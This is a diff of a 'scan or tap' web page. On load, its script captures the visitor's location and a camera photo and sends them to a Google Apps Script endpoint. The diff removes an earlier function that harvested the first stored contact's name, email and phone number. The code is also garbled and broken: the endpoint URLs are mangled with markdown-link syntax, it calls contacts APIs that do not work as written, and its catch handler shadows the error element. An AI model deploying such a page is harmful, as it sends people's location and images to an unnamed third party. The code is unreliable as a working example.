@@ -15,31 +15,30 @@
             font-size: 18px;
             color: green;
         }
+        #error {
+            margin-top: 20px;
+            font-size: 18px;
+            color: red;
+        }
     </style>
 </head>
 <body>
     <h1>Scan or Tap to Capture Information</h1>
     <p>Please allow access to your contacts, location, and camera.</p>
     <div id="message"></div>
+    <div id="error"></div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const message = document.getElementById('message');
+            const error = document.getElementById('error');
 
             // Request permissions
-            navigator.permissions.query({ name: 'contacts' }).then(result => {
-                if (result.state === 'granted') {
-                    captureContacts();
-                } else {
-                    message.textContent = 'Contacts access not granted.';
-                }
-            });
-
             navigator.permissions.query({ name: 'geolocation' }).then(result => {
                 if (result.state === 'granted') {
                     captureLocation();
                 } else {
-                    message.textContent = 'Location access not granted.';
+                    error.textContent = 'Location access not granted.';
                 }
             });
 
@@ -47,25 +46,17 @@
                 if (result.state === 'granted') {
                     capturePhoto();
                 } else {
-                    message.textContent = 'Camera access not granted.';
+                    error.textContent = 'Camera access not granted.';
                 }
             });
-
-            function captureContacts() {
-                navigator.contacts.getAll().then(contacts => {
-                    const contact = contacts[0]; // Assuming the first contact is the user
-                    const phoneNumber = contact.tel[0].value;
-                    const email = contact.emails[0].value;
-                    const name = contact.name.formatted;
-                    sendDataToServer(name, email, phoneNumber);
-                });
-            }
 
             function captureLocation() {
                 navigator.geolocation.getCurrentPosition(position => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     sendDataToServer(null, null, null, latitude, longitude);
+                }, err => {
+                    error.textContent = 'Failed to capture location: ' + err.message;
                 });
             }
 
@@ -83,16 +74,19 @@
                         const photo = canvas.toDataURL('image/jpeg');
                         sendDataToServer(null, null, null, null, null, photo);
                     };
+                }).catch(err => {
+                    error.textContent = 'Failed to capture photo: ' + err.message;
                 });
             }
 
             function sendDataToServer(name, email, phoneNumber, latitude, longitude, photo) {
-                fetch('[https://script.google.com/macros/s/AKfycbzwaHFzme8IT67yRMpeqqa0MusN5eyaX7qjEGflMqjjE6ctiNI0s1dEB93RRq9PnC0/exec)', {
+                fetch('https://script.google.com/macros/s/YOUR_WEB_APP_ID/exec](https://script.google.com/macros/s/YOUR_WEB_APP_ID/exec', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
+                        action: 'captureInfo',
                         name: name,
                         email: email,
                         phoneNumber: phoneNumber,
@@ -101,13 +95,22 @@
                         photo: photo
                     })
                 })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.json();
+                })
                 .then(data => {
-                    message.textContent = 'Information captured successfully!';
+                    if (data.status === 'success') {
+                        message.textContent = 'Information captured successfully!';
+                    } else {
+                        error.textContent = 'Failed to capture information: ' + data.message;
+                    }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    message.textContent = 'Failed to capture information.';
+                    error.textContent = 'Failed to capture information: ' + error.message;
                 });
             }
         });
